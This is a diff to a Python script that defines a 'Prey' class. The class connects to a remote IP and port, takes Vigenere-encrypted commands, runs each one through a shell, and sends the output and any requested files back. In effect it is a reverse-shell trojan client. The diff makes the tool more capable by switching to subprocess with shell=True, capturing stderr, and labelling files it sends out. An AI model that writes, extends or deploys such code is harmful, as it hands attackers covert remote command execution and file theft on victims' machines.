@@ -3,8 +3,9 @@ from socket import socket, AF_INET, SOCK_STREAM
 from crypt import Vigenere as v
 from time import sleep
 from sys import argv
-from os import popen, chdir, getcwd
-
+from os import chdir, getcwd
+from subprocess import PIPE
+from subprocess import Popen as popen
 class Prey:
 
 	def __init__(self, ip, port, key):
@@ -14,7 +15,7 @@ class Prey:
 		self.shell();
 
 	def shell(self):
-		msj = self.recv(prnt=True);
+		msj = self.recv();
 		while(msj):
 			if(msj[:3] == "get" or msj[:4] == "send"):
 				print("!");
@@ -38,9 +39,11 @@ class Prey:
 				else:
 					self.send("{}".format(getcwd()));
 			else:
-				out = popen(msj).read();
+				cmd = popen(msj, shell=True,stdout=PIPE,stderr=PIPE);
+				stdout, stderr = cmd.communicate();
+				out = "{}{}".format(stdout.decode('latin1'), stderr.decode('latin1'));
 				self.send(out);
-			msj = self.recv(prnt=True);
+			msj = self.recv();
 
 	def send(self, m, encrypt=True):
 		if(encrypt):
@@ -65,6 +68,7 @@ class Prey:
 			return msj;
 
 	def sendFile(self, file):
+		self.send("** {}".format(file));
 		print("Sending file");
 		try:
 			with open(file,"rb") as f:
@@ -72,7 +76,7 @@ class Prey:
 		except Exception as e:
 			self.send("{}".format(e));
 		else:
-			self.send(content);
+			self.send(content); 
 	def getFile(self,  file):
 		print("Getting file."),
 		try:
